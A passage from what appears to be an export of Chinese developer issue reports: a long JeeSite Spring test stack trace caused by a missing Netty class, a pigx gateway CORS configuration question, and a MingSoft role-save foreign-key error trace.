org.springframework.test.context.web.ServletTestExecutionListener.prepareTestInstance(ServletTestExecutionListener.java:132) at org.springframework.test.context.TestContextManager.prepareTestInstance(TestContextManager.java:246) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.createTest(SpringJUnit4ClassRunner.java:227) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner$1.runReflectiveCall(SpringJUnit4ClassRunner.java:289) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.methodBlock(SpringJUnit4ClassRunner.java:291) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:246) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:97) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:190) at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50) at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:459) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:675) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:382) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:192) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'shiroFilter' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'shiroFilter' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 3; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroCacheManager' defined in class path resource [com/jeesite/autoconfigure/core/CacheAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:733) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:475) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1246) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1096) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getSingletonFactoryBeanForTypeCheck(AbstractAutowireCapableBeanFactory.java:943) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryBean(AbstractAutowireCapableBeanFactory.java:826) at org.springframework.beans.factory.support.AbstractBeanFactory.isTypeMatch(AbstractBeanFactory.java:571) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:426) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:389) at org.springframework.beans.factory.BeanFactoryUtils.beanNamesForTypeIncludingAncestors(BeanFactoryUtils.java:214) at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1273) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1098) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1062) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:819) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:725) ... 44 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 3; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroCacheManager' defined in class path resource [com/jeesite/autoconfigure/core/CacheAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:733) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:475) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1246) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1096) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:535) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:495) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:317) at org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$147/291847739.getObject(Unknown Source) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:315) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:251) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1135) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1062) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:819) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:725) ... 58 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroCacheManager' defined in class path resource [com/jeesite/autoconfigure/core/CacheAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:591) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1246) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1096) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:535) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:495) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:317) at org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$147/291847739.getObject(Unknown Source) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:315) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:251) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1135) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1062) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:819) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:725) ... 73 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:583) ... 87 common frames omitted Caused by: java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at com.jeesite.common.web.i.f.enum(sf:506) at com.jeesite.common.web.i.f.do(sf:499) at com.jeesite.common.web.i.f.class(sf:73) at com.jeesite.common.shiro.j.c.enum(dy:107) at com.jeesite.common.shiro.j.c.&lt;clinit&gt;(dy:65) at com.jeesite.common.shiro.j.b.&lt;init&gt;(dy:36) at com.jeesite.autoconfigure.core.CacheAutoConfiguration.shiroCacheManager(fz:76) at com.jeesite.autoconfigure.core.CacheAutoConfiguration$$EnhancerBySpringCGLIB$$7c3f2cab.CGLIB$shiroCacheManager$0(&lt;generated&gt;) at com.jeesite.autoconfigure.core.CacheAutoConfiguration$$EnhancerBySpringCGLIB$$7c3f2cab$$FastClassBySpringCGLIB$$6b5dfff7.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:228) at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:365) at com.jeesite.autoconfigure.core.CacheAutoConfiguration$$EnhancerBySpringCGLIB$$7c3f2cab.shiroCacheManager(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ... 88 common frames omitted Caused by: java.lang.ClassNotFoundException: io.netty.channel.EventLoopGroup at java.net.URLClassLoader$1.run(Unknown Source) at java.net.URLClassLoader$1.run(Unknown Source) at java.security.AccessController.doPrivileged(Native Method) at java.net.URLClassLoader.findClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) ... 105 common frames omitted 08-26 10:59:43.461 ERROR [o.s.test.context.TestContextManager ] - Caught exception while allowing TestExecutionListener [org.springframework.test.context.web.ServletTestExecutionListener@3cce5371] to prepare test instance [com.jeesite.test.InitCoreData@7df4709e] java.lang.IllegalStateException: Failed to load ApplicationContext at org.springframework.test.context.cache.DefaultCacheAwareContextLoaderDelegate.loadContext(DefaultCacheAwareContextLoaderDelegate.java:125) at org.springframework.test.context.support.DefaultTestContext.getApplicationContext(DefaultTestContext.java:108) at org.springframework.test.context.web.ServletTestExecutionListener.setUpRequestContextIfNecessary(ServletTestExecutionListener.java:190) at org.springframework.test.context.web.ServletTestExecutionListener.prepareTestInstance(ServletTestExecutionListener.java:132) at org.springframework.test.context.TestContextManager.prepareTestInstance(TestContextManager.java:246) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.createTest(SpringJUnit4ClassRunner.java:227) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner$1.runReflectiveCall(SpringJUnit4ClassRunner.java:289) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.methodBlock(SpringJUnit4ClassRunner.java:291) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:246) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:97) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:190) at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50) at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:459) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:675) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:382) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:192) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'methodValidationPostProcessor' defined in class path resource [org/springframework/boot/autoconfigure/validation/ValidationAutoConfiguration.class]: Unsatisfied dependency expressed through method 'methodValidationPostProcessor' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'shiroFilter' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'shiroFilter' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 3; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroCacheManager' defined in class path resource [com/jeesite/autoconfigure/core/CacheAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:733) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:475) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1246) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1096) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:535) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:495) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:317) at org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$147/291847739.getObject(Unknown Source) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:315) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:204) at org.springframework.context.support.PostProcessorRegistrationDelegate.registerBeanPostProcessors(PostProcessorRegistrationDelegate.java:224) at org.springframework.context.support.AbstractApplicationContext.registerBeanPostProcessors(AbstractApplicationContext.java:708) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:533) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:386) at org.springframework.boot.SpringApplication.run(SpringApplication.java:307) at org.springframework.boot.test.context.SpringBootContextLoader.loadContext(SpringBootContextLoader.java:127) at org.springframework.test.context.cache.DefaultCacheAwareContextLoaderDelegate.loadContextInternal(DefaultCacheAwareContextLoaderDelegate.java:99) at org.springframework.test.context.cache.DefaultCacheAwareContextLoaderDelegate.loadContext(DefaultCacheAwareContextLoaderDelegate.java:117) ... 25 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'shiroFilter' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'shiroFilter' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 3; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroCacheManager' defined in class path resource [com/jeesite/autoconfigure/core/CacheAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:733) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:475) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1246) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1096) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getSingletonFactoryBeanForTypeCheck(AbstractAutowireCapableBeanFactory.java:943) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryBean(AbstractAutowireCapableBeanFactory.java:826) at org.springframework.beans.factory.support.AbstractBeanFactory.isTypeMatch(AbstractBeanFactory.java:571) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:426) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:389) at org.springframework.beans.factory.BeanFactoryUtils.beanNamesForTypeIncludingAncestors(BeanFactoryUtils.java:214) at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1273) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1098) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1062) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:819) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:725) ... 44 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'securityManager' defined in class path resource [com/jeesite/modules/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'securityManager' parameter 3; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroCacheManager' defined in class path resource [com/jeesite/autoconfigure/core/CacheAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:733) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:475) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1246) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1096) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:535) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:495) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:317) at org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$147/291847739.getObject(Unknown Source) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:315) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:251) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1135) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1062) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:819) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:725) ... 58 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'shiroCacheManager' defined in class path resource [com/jeesite/autoconfigure/core/CacheAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:591) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1246) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1096) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:535) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:495) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:317) at org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$147/291847739.getObject(Unknown Source) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:315) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:251) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1135) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1062) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:819) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:725) ... 73 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.jeesite.common.shiro.j.J]: Factory method 'shiroCacheManager' threw exception; nested exception is java.lang.NoClassDefFoundError: io/netty/channel/EventLoopGroup at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:583) ... 87 common frames omitted C
直接访问服务没有跨域，经过网关跨出现域问题,"环境信息 pigx版本: 4.0 是否修改包名: 否 问题说明 通过网关访问服务出现跨域问题，直接访问服务没有跨域，网关服务已经按照文档做了配置。 下面是提供的配置和配置的相关图片。 问题图片   <code>: spring: cloud: gateway: globalcors: corsConfigurations: '[/**]': allowedOriginPatterns: ""*"" #注意这个设置只对 spring boot 2.4+ 有效， pigx v4.0+ ,低版本 使用 allowedOrigins: ""*"" allowed-methods: ""*"" allowed-headers: ""*"" allow-credentials: true exposedHeaders: ""Content-Disposition,Content-Type,Cache-Control"" gateway nginx"
新增角色 报错,"Cause: java.sql.SQLIntegrityConstraintViolationException: Cannot add or update a child row: a foreign key constraint fails (., CONSTRAINT FOREIGN KEY () REFERENCES () ON DELETE CASCADE ON UPDATE NO ACTION) ; Cannot add or update a child row: a foreign key constraint fails (., CONSTRAINT FOREIGN KEY () REFERENCES () ON DELETE CASCADE ON UPDATE NO ACTION); nested exception is java.sql.SQLIntegrityConstraintViolationException: Cannot add or update a child row: a foreign key constraint fails (., CONSTRAINT FOREIGN KEY () REFERENCES () ON DELETE CASCADE ON UPDATE NO ACTION) at org.springframework.jdbc.support.SQLErrorCodeSQLExceptionTranslator.doTranslate(SQLErrorCodeSQLExceptionTranslator.java:247) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:72) at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:73) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:446) at com.sun.proxy.$Proxy111.insert(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.insert(SqlSessionTemplate.java:278) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:58) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) at com.sun.proxy.$Proxy113.saveEntity(Unknown Source) at net.mingsoft.basic.biz.impl.RoleModelBizImpl.saveEntity(RoleModelBizImpl.java:66) at net.mingsoft.basic.biz.impl.RoleModelBizImpl$$FastClassBySpringCGLIB$$1c0ef115.invoke() at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at com.alibaba.druid.support.spring.stat.DruidStatInterceptor.invoke(DruidStatInterceptor.java:72) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at net.mingsoft.basic.biz.impl.RoleModelBizImpl$$EnhancerBySpringCGLIB$$2154b10.saveEntity() at net.mingsoft.basic.action.RoleAction.saveOrUpdateRole(RoleAction.java:179) at net.mingsoft.basic.action.RoleAction$$FastClassBySpringCGLIB$$77dcaaa6.invoke() at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor.invoke(AfterReturningAdviceInterceptor.java:55) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.aspectj.AspectJAfterThrowingAdvice.invoke(AspectJAfterThrowingAdvice.java:62) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor.invoke(AfterReturningAdviceInterceptor.java:55) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.aspectj.AspectJAfterThrowingAdvice.invoke(AspectJAfterThrowingAdvice.java:62) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:93) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) at 